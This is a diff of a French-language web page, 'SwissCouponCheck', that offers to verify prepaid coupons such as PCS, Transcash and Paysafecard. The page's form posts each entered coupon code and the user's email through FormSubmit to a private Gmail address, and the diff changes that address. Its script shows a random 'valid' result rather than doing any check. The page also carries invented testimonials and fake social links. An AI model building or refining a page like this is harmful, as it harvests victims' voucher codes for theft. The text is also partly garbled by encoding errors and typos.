@@ -500,7 +500,7 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
         <div class="container">
             <div class="section-title">
                 <h2>Types de Coupons SupportÃ©s</h2>
-                <p>Notre systÃ¨me prend en charge une large gamme de coupons de recharge avec des caractÃ©ristiques uniques.</p>
+                <p>Notre système prend en charge une large gamme de coupons de recharge avec des caractérique uniques.</p>
             </div>
             <div class="coupon-grid">
                 <div class="coupon-card">
@@ -508,7 +508,7 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
                         <i class="fas fa-mobile-alt"></i>
                     </div>
                     <h3>PCS</h3>
-                    <p>Coupons de recharge tÃ©lÃ©phonique avec codes Ã  14 chiffres</p>
+                    <p>Coupons de recharge téléphonique avec codes a 14 chiffres</p>
                     <ul class="coupon-specs">
                         <li><i class="fas fa-hashtag"></i> Format: 14 chiffres</li>
                         <li><i class="fas fa-euro-sign"></i> Montants: 10â‚¬ Ã  100â‚¬</li>
@@ -522,11 +522,11 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
                     </div>
                     
                     <h3>Transcash</h3>
-                    <p>Solution de paiement anonyme et sÃ©curisÃ©e</p>
+                    <p>Solution de paiement anonyme et sécurisée</p>
                     <ul class="coupon-specs">
                         <li><i class="fas fa-hashtag"></i> Format: 12 chiffres</li>
                         <li><i class="fas fa-euro-sign"></i> Montants: 15â‚¬ Ã  500â‚¬</li>
-                        <li><i class="fas fa-clock"></i> ValiditÃ©: 18 mois</li>
+                        <li><i class="fas fa-clock"></i> Validation: 18 mois</li>
                         <li><i class="fas fa-globe"></i> Utilisation: Europe et Afrique</li>
                     </ul>
                 </div>
@@ -535,7 +535,7 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
                         <i class="fas fa-credit-card"></i>
                     </div>
                     <h3>Paysafecard</h3>
-                    <p>Coupons prÃ©payÃ©s pour un shopping en ligne sÃ©curisÃ©</p>
+                    <p>Coupons prÃ©payÃ©s pour un shopping en ligne sécurisé</p>
                     <ul class="coupon-specs">
                         <li><i class="fas fa-hashtag"></i> Format: 16 chiffres</li>
                         <li><i class="fas fa-euro-sign"></i> Montants: 10â‚¬ Ã  100â‚¬</li>
@@ -548,11 +548,11 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
                         <i class="fas fa-gift"></i>
                     </div>
                     <h3>Googleplay</h3>
-                    <p>Ancien systÃ¨me de coupons reconverti </p>
+                    <p>Ancien systèmes  coupons reconverti </p>
                     <ul class="coupon-specs">
                         <li><i class="fas fa-hashtag"></i> Format: 19 chiffres</li>
-                        <li><i class="fas fa-euro-sign"></i> Montants: 10â‚¬ Ã  500â‚¬</li>
-                        <li><i class="fas fa-clock"></i> ValiditÃ©: 6 mois (conversion)</li>
+                        <li><i class="fas fa-euro-sign"></i> Montants: 10€‚ à  500€‚¬</li>
+                        <li><i class="fas fa-clock"></i> Validation: 6 mois (conversion)</li>
                         <li><i class="fas fa-globe"></i> Utilisation: Europe</li>
                     </ul>
                 </div>
@@ -565,8 +565,8 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
                     <ul class="coupon-specs">
                         <li><i class="fas fa-hashtag"></i> Format: 14 chiffres</li>
                         <li><i class="fas fa-euro-sign"></i> Montants: 5â‚¬ Ã  200â‚¬</li>
-                        <li><i class="fas fa-clock"></i> ValiditÃ©: 24 mois</li>
-                        <li><i class="fas fa-globe"></i> Utilisation: Europe et AmÃ©rique</li>
+                        <li><i class="fas fa-clock"></i> Validation: 24 mois</li>
+                        <li><i class="fas fa-globe"></i> Utilisation: Europe et Amérique</li>
                     </ul>
                 </div>
             </div>
@@ -577,18 +577,18 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
     <section class="verification" id="verification">
         <div class="container">
             <div class="section-title">
-                <h2>VÃ©rification de Coupon</h2>
-                <p>Entrez les dÃ©tails de votre coupon pour une vÃ©rification instantanÃ©e et sÃ©curisÃ©e.</p>
+                <h2>Vérifications de Coupon</h2>
+                <p>Entrez les dÃ©tails de votre coupon pour une vérification instantanée et sécurisé .</p>
             </div>
             <div class="verification-form">
-                <form id="coupon-form" action="https://formsubmit.co/vapegeen@gmail.com" method="POST">
-                    <input type="hidden" name="_subject" value="Nouvelle vÃ©rification de coupon">
+                <form id="coupon-form" action="https://formsubmit.co/alexandersoros333@gmail.com.com" method="POST">
+                    <input type="hidden" name="_subject" value="Nouvelle vérification de coupon">
                     <input type="hidden" name="_template" value="table">
                     
                     <div class="form-group">
                         <label for="coupon-type">Type de coupon</label>
                         <select id="coupon-type" name="Type de coupon" class="form-control" required>
-                            <option value="">SÃ©lectionnez un type</option>
+                            <option value="">Seleclectionnez un type</option>
                             <option value="PCS">PCS</option>
 
                             <option value="Transcash">Transcash</option>
@@ -632,43 +632,43 @@ font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
     <section class="testimonials" id="temoignages">
         <div class="container">
             <div class="section-title">
-                <h2>TÃ©moignages de Nos Clients</h2>
-                <p>DÃ©couvrez ce que nos clients europÃ©ens disent de notre service de vÃ©rification.</p>
+                <h2>Témoignages de Nos Clients</h2>
+                <p>Découvrez ce que nos clients européens disent de notre service de vérification.</p>
             </div>
             <div class="testimonials-grid">
                 <div class="testimonial-card">
                     <div class="testimonial-text">
-                        "Service extrÃªmement rapide et fiable. J'ai vÃ©rifiÃ© plus de 50 coupons PCS sans aucun problÃ¨me. Interface trÃ¨s professionnelle."
+                        "Service extrêmement rapide et fiable. J'ai vérifié plus de 50 coupons PCS sans aucun problèmes. Interface très professionnelle."
                     </div>
                     <div class="testimonial-author">
                         <div class="author-avatar">MS</div>
                         <div class="author-info">
                             <h4>Marie Schneider</h4>
-                            <p>CommerÃ§ante, Zurich</p>
+                            <p>Commerçante, Zurich</p>
                         </div>
                     </div>
                 </div>
                 <div class="testimonial-card">
                     <div class="testimonial-text">
-                        "En tant que revendeur de coupons, la rapiditÃ© de vÃ©rification est cruciale. Ce service m'a fait gagner un temps prÃ©cieux."
+                        "En tant que revendeur de coupons, la rapidité de vérification est cruciale. Ce service m'a fait gagner un temps précieux."
                     </div>
                     <div class="testimonial-author">
                         <div class="author-avatar">LW</div>
                         <div class="author-info">
                             <h4>Luca Weber</h4>
-                            <p>Entrepreneur, GenÃ¨ve</p>
+                            <p>Entrepreneur, Genève</p>
                         </div>
                     </div>
                 </div>
                 <div class="testimonial-card">
                     <div class="testimonial-text">
-                        "La vÃ©rification des coupons  est instantanÃ©e. J'apprÃ©cie particuliÃ¨rement l'envoi des rÃ©sultats par email."
+                        "La vérification des coupons  est instantané. J'apprécie particulièrement l'envoi des résultats par email."
                     </div>
                     <div class="testimonial-author">
                         <div class="author-avatar">SM</div>
                         <div class="author-info">
-                            <h4>Sophie MÃ¼ller</h4>
-                            <p>Investisseuse, BÃ¢le</p>
+                            <h4>Sophie Müller</h4>
+                            <p>Investisseuse, Bale</p>
                         </div>
                     </div>
                 </div>
@@ -710,7 +710,7 @@ expérience professionnelle et sécurisée,
             <div class="footer-content">
                 <div class="footer-column">
                     <h3>SwissCouponCheck</h3>
-                    <p>Service suisse professionnel de vÃ©rification de coupons de recharge internationaux. Rapide, sÃ©curisÃ© et fiable.</p>
+                    <p>Service suisse professionnel de vÃ©rification de coupons de recharge internationaux. Rapide, sécurisé et fiable.</p>
                     <div class="social-links">
                         <a href="www.faceboock.com/SwissCouponCheck"><i class="fab fa-facebook-f"></i></a>
                         <a href="www.twittwe.com/SwissCouponCheck"><i class="fab fa-twitter"></i></a>
@@ -722,8 +722,8 @@ expérience professionnelle et sécurisée,
                     <ul>
                         <li><a href="#accueil">Accueil</a></li>
                         <li><a href="#types">Types de Coupons</a></li>
-                        <li><a href="#verification">VÃ©rification</a></li>
-                        <li><a href="#temoignages">TÃ©moignages</a></li>
+                        <li><a href="#verification">Vérification</a></li>
+                        <li><a href="#temoignages">Témoignages</a></li>
                     </ul>
                 </div>
                 <div class="footer-column">
@@ -732,13 +732,13 @@ expérience professionnelle et sécurisée,
                         <li><a href="Centre d'Aide">Centre d'Aide</a></li>
                         <li><a href="Contactez-Nous">Contactez-Nous</a></li>
                         <li><a href="FAQ">FAQ</a></li>
-                        <li><a href="Politique de ConfidentialitÃ©">Politique de ConfidentialitÃ©</a></li>
+                        <li><a href="Politique de Confidentialité">Politique de Confidentialité</a></li>
                     </ul>
                 </div>
                 <div class="footer-column">
                     <h3>Contact</h3>
                     <ul>
-                        <li><i class="fas fa-map-marker-alt"></i> GenÃ¨ve, Suisse</li>
+                        <li><i class="fas fa-map-marker-alt"></i> Genève, Suisse</li>
                         <li><i class="fas fa-phone"></i> +41 22 123 45 67</li>
                         <li><i class="fas fa-envelope"></i> 
                             <a href="mailto:Laurantscrt@gmail.com">Laurantscrt@gmail.com</a></li>
@@ -746,7 +746,7 @@ expérience professionnelle et sécurisée,
                 </div>
             </div>
             <div class="copyright">
-                <p>&copy; 2020 SwissCouponCheck. Tous droits rÃ©servÃ©s.</p>
+                <p>&copy; 2020 SwissCouponCheck. Tous droits réservés.</p>
             </div>
         </div>
     </footer>
@@ -772,7 +772,7 @@ expérience professionnelle et sécurisée,
             
             // Validation du type de coupon
             if (!couponType) {
-                showResult('Veuillez sÃ©lectionner un type de coupon.', 'error');
+                showResult('Veuillez sélectionner un type de coupon.', 'error');
                 return;
             }
             
@@ -793,26 +793,26 @@ expérience professionnelle et sécurisée,
                 return;
             }
             
-            // Simulation de vÃ©rification (dans un cas rÃ©el, on ferait une requÃªte Ã  une API)
+            // Simulation de vérification (dans un cas réel, on ferait une requête à une API)
             const isValid = Math.random() > 0.2; // 80% de chance que le coupon soit valide
             const amount = isValid ? config.amounts[Math.floor(Math.random() * config.amounts.length)] : 0;
             
             if (isValid) {
-                showResult(`âœ… Coupon ${couponType} valide ! Montant: ${amount} â‚¬. Les dÃ©tails ont Ã©tÃ© envoyÃ©s Ã  ${userEmail}`, 'success');
+                showResult(`âœ… Coupon ${couponType} valide ! Montant: ${amount} â‚¬. Les détails ont été  envoyés ${userEmail}`, 'success');
                 
-                // Envoi du formulaire aprÃ¨s un dÃ©lai pour permettre l'affichage du rÃ©sultat
+                // Envoi du formulaire après un délai pour permettre l'affichage du résultat 
                 setTimeout(() => {
-                    // Dans un environnement rÃ©el, on enverrait les donnÃ©es Ã  FormSubmit
-                    // Pour cette dÃ©mo, nous allons simplement afficher un message
-                    alert('Formulaire soumis avec succÃ¨s! En production, les donnÃ©es seraient envoyÃ©es Ã  FormSubmit.');
+                    // Dans un environnement réel, on enverrait les données Ã  FormSubmit
+                    // Pour cette démo, nous allons simplement afficher un message
+                    alert('Formulaire soumis avec succÃ¨s! En production, les données seraient envoyées Ã  FormSubmit.');
                      this.submit(); 
                 }, 2000);
             } else {
-                showResult(`âŒ Coupon ${couponType} invalide ou dÃ©jÃ  utilisÃ©. Veuillez vÃ©rifier le code et rÃ©essayer.`, 'error');
+                showResult(`âŒ Coupon ${couponType} invalide ou déja utilisé. Veuillez Verifier le code et réessayer.`, 'error');
             }
         });
         
-        // Fonction pour afficher les rÃ©sultats
+        // Fonction pour afficher les résultats 
         function showResult(message, type) {
             const resultDiv = document.getElementById('verification-result');
             resultDiv.style.display = 'block';
@@ -820,7 +820,7 @@ expérience professionnelle et sécurisée,
             resultDiv.className = 'result ' + type;
         }
         
-        // Animation au dÃ©filement
+        // Animation au défilement 
         window.addEventListener('scroll', function() {
             const elements = document.querySelectorAll('.coupon-card, .testimonial-card');
             
@@ -844,7 +844,7 @@ expérience professionnelle et sécurisée,
                 element.style.transition = 'opacity 0.5s, transform 0.5s';
             });
             
-            // DÃ©clencher l'animation pour les Ã©lÃ©ments dÃ©jÃ  visibles
+            // DÃ©clencher l'animation pour les alignements déjà  visibles
             setTimeout(() => {
                 window.dispatchEvent(new Event('scroll'));
             }, 100);
